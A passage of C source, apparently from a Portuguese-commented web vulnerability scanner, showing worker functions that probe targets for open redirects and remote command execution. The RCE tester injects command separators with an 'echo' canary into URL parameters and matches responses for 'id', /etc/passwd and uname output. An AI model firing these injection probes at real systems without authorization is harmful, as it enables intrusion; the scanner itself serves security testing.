            snprintf(evidence,sizeof(evidence),"type=%s HTTP=%ld",ssrf_type,http_code);
            vuln_register("SSRF", ta->target, ta->payload, evidence, confidence, 90);
        }
    }

    free(wb.buf); free(ta); return NULL;
}

static void *test_worker_redir(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;
    char enc[512]; url_encode(ta->payload, enc, sizeof(enc));
    char url[2048]; snprintf(url, sizeof(url), "%s%s", ta->target, enc);

    CURL *ch = curl_easy_init();
    if(ch){
        char redirect_url[1024] = {0};
        curl_easy_setopt(ch, CURLOPT_URL, url);
        curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION, worker_write_cb);
        WorkBuf wb = {0}; wb.buf = malloc(512); wb.cap = 512;
        curl_easy_setopt(ch, CURLOPT_WRITEDATA, &wb);
        curl_easy_setopt(ch, CURLOPT_TIMEOUT, (long)ta->timeout);
        curl_easy_setopt(ch, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(ch, CURLOPT_FOLLOWLOCATION, 0L);
        CURLcode rc = curl_easy_perform(ch);
        char *ru = NULL;
        curl_easy_getinfo(ch, CURLINFO_REDIRECT_URL, &ru);
        if(ru) strncpy(redirect_url, ru, sizeof(redirect_url)-1);
        curl_easy_cleanup(ch);
        free(wb.buf);

        if(rc == CURLE_OK && strlen(redirect_url) > 4) {
            // Só é VULN se o redirect_url começa com http:// ou https://
            // E aponta para domínio DIFERENTE do target original
            int is_external = 0;
            if((strncmp(redirect_url,"http://",7)==0 || strncmp(redirect_url,"https://",8)==0)) {
                // Extrai domínio do redirect
                const char *rdom = redirect_url + (strncmp(redirect_url,"https",5)==0 ? 8 : 7);
                // Extrai domínio do target original
                const char *tdom = ta->target;
                if(strncmp(tdom,"http://",7)==0) tdom += 7;
                else if(strncmp(tdom,"https://",8)==0) tdom += 8;
                // Compara: extrai só o host (até '/', ':', '?')
                char rhost[256]={0}, thost[256]={0};
                int ri=0; while(rdom[ri]&&rdom[ri]!='/'&&rdom[ri]!=':'&&rdom[ri]!='?'&&ri<255) { rhost[ri]=rdom[ri]; ri++; }
                int ti=0; while(tdom[ti]&&tdom[ti]!='/'&&tdom[ti]!=':'&&tdom[ti]!='?'&&ti<255) { thost[ti]=tdom[ti]; ti++; }
                // É externo se o host do redirect != host do target
                if(strlen(rhost)>0 && strcmp(rhost,thost)!=0) {
                    is_external = 1;
                }
            }
            if(is_external) {
                printf("\033[1;31m  [✓ REDIR] %s → %s\033[0m\n", ta->payload, redirect_url);
                found_register(ta->payload);
            }
        }
    }
    free(ta); return NULL;
}

static void *test_worker_rce(void *arg) {
    test_arg_t *ta = (test_arg_t*)arg;

    /* ══════════════════════════════════════════════════════════════════
     * RCE Detection — Nível Metasploit
     *
     * REGRA: padrões genéricos como "uid=" em qualquer página = FP alto.
     * Estratégia de confirmação em 2 camadas:
     *
     * CAMADA 1 — Injeção de canary único:
     *   Modifica o payload para executar: echo ELLIOT_RCE_<timestamp>
     *   Se a string aparece na resposta = execução confirmada.
     *   O timestamp torna o canary único, impossível de estar no código.
     *
     * CAMADA 2 — Padrões de output de comando (fallback):
     *   Só registra padrões fortes (uid=N(user) com contexto completo).
     *   Padrões ambíguos ("sh:", "/bin/bash") exigem baseline diff.
     *   Anti-FP: padrão não pode estar no payload.
     *
     * PARA PAYLOADS SEM MODIFICAÇÃO (pipe, semicolon, backtick):
     *   Canary é injetado via concatenação: ;echo CANARY
     *   Se payload já tem output específico: detecta pelo padrão
     * ══════════════════════════════════════════════════════════════════ */

    /* Gera canary único baseado no payload para evitar colisão entre threads */
    char canary[64]={0};
    {
        unsigned long h=5381;
        for(const char *s=ta->payload;*s;s++) h=((h<<5)+h)+(unsigned char)*s;
        snprintf(canary,sizeof(canary),"ELLIOT%08lX",h&0xFFFFFFFFUL);
    }

    /* Tenta injetar canary no payload */
    char payload_canary[1024]={0};
    int can_inject=0;
    {
        /* Separadores de comando que permitem injeção de segundo comando */
        const char *seps[]={";"," && ","|","||","\n","`","$(",NULL};
        for(int si=0;seps[si]&&!can_inject;si++){
            if(strstr(ta->payload,seps[si])){
                /* Payload já usa separador — pode ter output próprio */
                snprintf(payload_canary,sizeof(payload_canary),
                    "%s%secho %s",ta->payload,seps[si],canary);
                can_inject=1;
            }
        }
        if(!can_inject){
            /* Payload não tem separador explícito (ex: template injection)
             * Tenta adicionar ; como sufixo */
            if(strstr(ta->payload,"cmd=")||strstr(ta->payload,"exec=")||
               strstr(ta->payload,"command=")||strstr(ta->payload,"ping ")||
               strstr(ta->payload,"system(")){
                snprintf(payload_canary,sizeof(payload_canary),
                    "%s;echo %s",ta->payload,canary);
                can_inject=1;
            }
        }
    }

    /* Request 1: payload original */
    char enc[512]; url_encode(ta->payload,enc,sizeof(enc));
    char url[2048]; snprintf(url,sizeof(url),"%s%s",ta->target,enc);

    WorkBuf wb={0}; wb.buf=malloc(32768); wb.cap=32768;
    if(!wb.buf){ free(ta); return NULL; }

    CURL *ch=curl_easy_init();
    if(!ch){ free(wb.buf); free(ta); return NULL; }
    curl_easy_setopt(ch,CURLOPT_URL,url);
    curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
    curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
    curl_easy_setopt(ch,CURLOPT_TIMEOUT,(long)ta->timeout);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
    curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
    curl_easy_setopt(ch,CURLOPT_USERAGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    CURLcode rc=curl_easy_perform(ch);
    curl_easy_cleanup(ch);

    if(rc!=CURLE_OK||wb.len==0){ free(wb.buf); free(ta); return NULL; }

    char resp_lower[32768]={0};
    int rl=wb.len<32767?(int)wb.len:32767;
    for(int i=0;i<rl;i++) resp_lower[i]=(char)tolower((unsigned char)wb.buf[i]);
    char pay_lower[512]={0};
    int pl=(int)strlen(ta->payload); if(pl>511)pl=511;
    for(int i=0;i<pl;i++) pay_lower[i]=(char)tolower((unsigned char)ta->payload[i]);

    int hit=0; const char *hit_label=""; int confidence=0;

    /* ── CAMADA 1: canary injection ── */
    if(can_inject && payload_canary[0]){
        char enc2[1024]; url_encode(payload_canary,enc2,sizeof(enc2));
        char url2[2048]; snprintf(url2,sizeof(url2),"%s%s",ta->target,enc2);

        WorkBuf wb2={0}; wb2.buf=malloc(32768); wb2.cap=32768;
        CURL *ch2=curl_easy_init();
        if(ch2&&wb2.buf){
            curl_easy_setopt(ch2,CURLOPT_URL,url2);
            curl_easy_setopt(ch2,CURLOPT_WRITEFUNCTION,worker_write_cb);
            curl_easy_setopt(ch2,CURLOPT_WRITEDATA,&wb2);
            curl_easy_setopt(ch2,CURLOPT_TIMEOUT,(long)ta->timeout);
            curl_easy_setopt(ch2,CURLOPT_SSL_VERIFYPEER,0L);
            curl_easy_setopt(ch2,CURLOPT_FOLLOWLOCATION,1L);
            curl_easy_setopt(ch2,CURLOPT_USERAGENT,
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            if(curl_easy_perform(ch2)==CURLE_OK && wb2.len>0){
                /* Canary deve aparecer na resposta MAS NÃO na resposta original */
                int in_original=buf_icontains(wb.buf,wb.len,canary);
                int in_canary_resp=buf_icontains(wb2.buf,wb2.len,canary);
                if(in_canary_resp && !in_original){
                    hit=1; confidence=2;
                    hit_label="canary-confirmed";
                }
            }
            curl_easy_cleanup(ch2);
        }
        free(wb2.buf);
    }

    /* ── CAMADA 2: padrões fortes de output de comando ── */
    if(!hit){
        /* uid=N(user) gid=N(group) — output de `id` — muito específico */
        if(strstr(resp_lower,"uid=") && strstr(resp_lower,"gid=") &&
           strstr(resp_lower,"(") && !strstr(pay_lower,"uid=")){
            hit=1; confidence=2; hit_label="id-output";
        }
        /* uid=0(root) sozinho com contexto */
        else if(strstr(resp_lower,"uid=0(root)") && !strstr(pay_lower,"uid=0")){
            hit=1; confidence=2; hit_label="root-uid";
        }
        /* /etc/passwd completo — múltiplas linhas com formato user:x:N:N: */
        else {
            int passwd_fmt=0;
            if(strstr(resp_lower,"root:x:0:0:")) passwd_fmt++;
            if(strstr(resp_lower,"daemon:x:1:1:")) passwd_fmt++;
            if(strstr(resp_lower,"nobody:x:")) passwd_fmt++;
            if(passwd_fmt>=2){ hit=1; confidence=2; hit_label="passwd-multi"; }
        }
        /* uname -a — "Linux hostname N.N.N.N #N SMP" */
        if(!hit && strstr(resp_lower,"linux ") && strstr(resp_lower,"#") &&
           strstr(resp_lower,"smp") && !strstr(pay_lower,"linux")){
            hit=1; confidence=2; hit_label="uname-output";
        }
        /* Windows: `dir C:\` tem formato muito específico */
        if(!hit && strstr(resp_lower,"volume serial number") &&
           strstr(resp_lower,"directory of")){
            hit=1; confidence=2; hit_label="windows-dir";
        }
        /* Windows ver */
        if(!hit && strstr(resp_lower,"microsoft windows [version") &&
           !strstr(pay_lower,"microsoft")){
            hit=1; confidence=2; hit_label="windows-ver";
        }
        /* Shell error com comando específico — confirma execução tentada */
        if(!hit && (strstr(resp_lower,"sh: ") || strstr(resp_lower,"bash: ")) &&
           strstr(resp_lower,"command not found") &&
           !strstr(pay_lower,"command not found")){
            /* Shell error = o shell executou mas o comando não existe
             * Isso confirma injeção, mas não execução de comando específico */
            hit=1; confidence=1; hit_label="shell-error";
        }
    }

    /* ── Diff-based: diff grande + linhas estruturadas ── */
    if(!hit && ta->baseline_len>0 && wb.len > ta->baseline_len+200){
        int colon_lines=0; const char *bp=resp_lower;
        while(bp&&*bp){
            const char *nl=strchr(bp,'\n'); if(!nl)nl=bp+strlen(bp);
            int cols=0; const char *lp=bp;
            while(lp<nl){if(*lp==':')cols++;lp++;}
            if(cols>=3) colon_lines++;
            bp=nl+1; if(!*nl)break;
        }
        if(colon_lines>=4){
            hit=1; confidence=1; hit_label="diff-structured";
        }
    }

    if(hit){
        const char *level=(confidence>=2)?"\033[1;31m[✓ RCE CONFIRMADO ]":
                                          "\033[1;33m[⚠ RCE SUSPEITO   ]";
        printf("%s [%s] %s\033[0m\n", level, hit_label, ta->payload);
        if(confidence>=2){
            char evidence[256]={0};
            snprintf(evidence,sizeof(evidence),"type=%s payload=%.100s",hit_label,ta->payload);
            vuln_register("RCE", ta->target, ta->payload, evidence, confidence, 95);
        }
    }

    free(wb.buf); free(ta); return NULL;
}

